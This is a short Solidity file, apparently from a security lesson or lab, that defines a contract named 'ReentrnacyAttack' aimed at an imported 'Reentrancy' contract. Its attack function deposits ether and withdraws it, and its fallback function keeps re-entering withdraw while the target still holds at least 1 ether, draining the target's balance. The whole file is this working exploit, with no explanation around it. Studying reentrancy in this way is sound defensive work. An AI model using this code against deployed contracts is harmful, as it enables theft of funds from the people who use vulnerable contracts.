// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrancy.sol';

contract ReentrnacyAttack { 
    Reentrancy public reentrancy;

    constructor(address _reentrancyAddress) public {
        reentrancy = Reentrancy(_reentrancyAddress);
    }

    function attack() external payable { 
        require(msg.value >= 1 ether);

         reentrancy.deposit{value: msg.value}();
        reentrancy.withdraw(1 ether);
    }

    fallback() external payable {
        if(address(reentrancy).balance >= 1 ether) {
            reentrancy.withdraw(1 ether); 
        }
    }

    function getContractBalance() public view returns (uint) { 
        return address(this).balance;
    }
}


